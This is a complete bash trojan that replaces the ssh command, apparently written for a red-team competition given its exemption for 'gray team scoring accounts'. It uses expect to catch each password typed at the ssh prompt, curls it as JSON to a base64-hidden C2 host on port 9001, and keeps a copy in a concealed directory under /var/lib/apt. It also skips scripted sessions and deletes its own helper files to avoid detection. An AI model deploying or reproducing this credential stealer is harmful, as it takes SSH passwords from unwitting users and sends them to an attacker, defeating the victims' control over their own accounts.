#!/bin/bash
REAL_SSH="/usr/bin/ssh"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SSH "$@" ;;
esac


LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

_json_esc() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    printf '%s' "$s"
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

# -------------------------------------------------------
# Parse destination and remote user from args
# -------------------------------------------------------
DEST_HOST=""
DEST_USER="$INVOKING_USER"
SKIP_NEXT=0
for arg in "$@"; do
    if [ "$SKIP_NEXT" -eq 1 ]; then
        SKIP_NEXT=0
        continue
    fi
    case "$arg" in
        -l) SKIP_NEXT=1 ;;
        -b|-c|-D|-E|-e|-F|-I|-i|-J|-L|-m|-o|-p|-Q|-R|-S|-w|-W)
            SKIP_NEXT=1 ;;
        -*)  ;;
        *)
            if [[ "$arg" == *"@"* ]]; then
                DEST_USER="${arg%%@*}"
                DEST_HOST="${arg##*@}"
            elif [ -z "$DEST_HOST" ]; then
                DEST_HOST="$arg"
            fi
            ;;
    esac
done

# Pass through for informational flags (no connection, no password)
for arg in "$@"; do
    case "$arg" in
        -V|-G|--help) exec $REAL_SSH "$@" ;;
    esac
done

# BatchMode=yes means no interactive password prompt — nothing to capture
case "$*" in
    *BatchMode=yes*) exec $REAL_SSH "$@" ;;
esac

# Pass straight through if stdin is not a terminal
# (Ansible, scripts, cron — anything non-interactive)
if [ ! -t 0 ]; then
    exec $REAL_SSH "$@"
fi

# PWFILE holds the captured password
# PAYFILE holds the JSON payload — written by expect, read by bash for local log
PWFILE=$(mktemp /tmp/.sshpw.XXXXXX)
PAYFILE=$(mktemp /tmp/.sshpay.XXXXXX)
chmod 600 "$PWFILE" "$PAYFILE"
trap 'rm -f "$PWFILE" "$PAYFILE"' EXIT

unset SSH_ASKPASS

# If expect is not installed, fall through to real ssh
if ! command -v expect >/dev/null 2>&1; then
    exec $REAL_SSH "$@"
fi

# -------------------------------------------------------
# Build the curl command string ahead of time so expect
# doesn't have to do any quoting — it just execs it.
# -------------------------------------------------------
# We write the payload after capturing the password, so we
# use a placeholder and swap it out in a helper script.
CURL_HELPER=$(mktemp /tmp/.sshcurl.XXXXXX)
chmod 700 "$CURL_HELPER"
trap 'rm -f "$PWFILE" "$PAYFILE" "$CURL_HELPER"' EXIT

# The helper reads the payload file and fires curl
cat > "$CURL_HELPER" << 'HELPER'
#!/bin/bash
PAYFILE="$1"
COLLECT_URL="$2"
if [ -s "$PAYFILE" ]; then
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "@$PAYFILE" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1
fi
HELPER

# -------------------------------------------------------
# expect: handle host key prompt, capture password,
# fire curl immediately via helper, then interact.
# -------------------------------------------------------
export __SSH_PW_FILE="$PWFILE"
export __SSH_PAY_FILE="$PAYFILE"
export __SSH_CURL="$CURL_HELPER"
export __SSH_COLL="$COLLECT_URL"
export __SSH_HIP="$HOST_IP"
export __SSH_USR="$INVOKING_USER"
export __SSH_TS="$HOST_TS"
export __SSH_DST="$DEST_HOST"
export __SSH_DU="$DEST_USER"

# Write expect script to a temp file so $argv works correctly.
# (expect -c 'script' args tries to source the first arg as a tcl
#  file instead of putting it in $argv — breaks on binaries)
EXPECT_SCRIPT=$(mktemp /tmp/.sshexp.XXXXXX)
chmod 700 "$EXPECT_SCRIPT"
cat > "$EXPECT_SCRIPT" << 'EXPECTEOF'
file delete [info script]
log_user 1
set timeout 30
set real_ssh [lindex $argv 0]
set ssh_args [lrange $argv 1 end]

spawn $real_ssh {*}$ssh_args

while 1 {
    expect {
        -re {Are you sure you want to continue connecting \(yes/no(/\[fingerprint\])?\)\?} {
            send "yes\r"
        }

        -re {\(yes/no\)\?} {
            send "yes\r"
        }

        -re {[Pp]assword[^:]*: $} {
            stty -echo
            expect_user -re {(.*)\n}
            set pw $expect_out(1,string)
            stty echo
            send_user "\n"

            set fh [open $env(__SSH_PW_FILE) w]
            puts -nonewline $fh $pw
            close $fh

            set safe_pw [string map {\\ \\\\ \" \\\"} $pw]
            set payload [format {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}} $env(__SSH_HIP) $env(__SSH_USR) $env(__SSH_TS) $env(__SSH_DST) $env(__SSH_DU) $safe_pw]
            set payload "{[string range $payload 0 end]}"
            set fh2 [open $env(__SSH_PAY_FILE) w]
            puts -nonewline $fh2 $payload
            close $fh2

            exec /bin/bash $env(__SSH_CURL) $env(__SSH_PAY_FILE) $env(__SSH_COLL) &

            send "$pw\r"
            interact
            break
        }

        eof { break }
        timeout { interact; break }
    }
}
EXPECTEOF

expect "$EXPECT_SCRIPT" "$REAL_SSH" "$@"
SSH_RC=$?

# Fallback: if curl helper didn't fire (e.g. key auth, no password prompt),
# nothing will be in pwfile, so this block is a no-op in that case.
# If it did fire, this sends again — cred_collector deduplicates by
# host+user+event so a double-send is harmless.
if [ -s "$PWFILE" ] && [ -n "$DEST_HOST" ]; then
    CAPTURED_PASS=$(cat "$PWFILE")
    if [ -n "$CAPTURED_PASS" ]; then
        SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"ssh","timestamp":"%s","data":{"destination":"%s","dest_user":"%s","password":"%s"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" \
            "$DEST_HOST" "$DEST_USER" "$SAFE_PASS")
        _log_remote "$PAYLOAD"
        _log_local "${HOST_TS}|ssh|${INVOKING_USER}|${DEST_USER}@${DEST_HOST}|${CAPTURED_PASS}"
    fi
fi

exit $SSH_RC
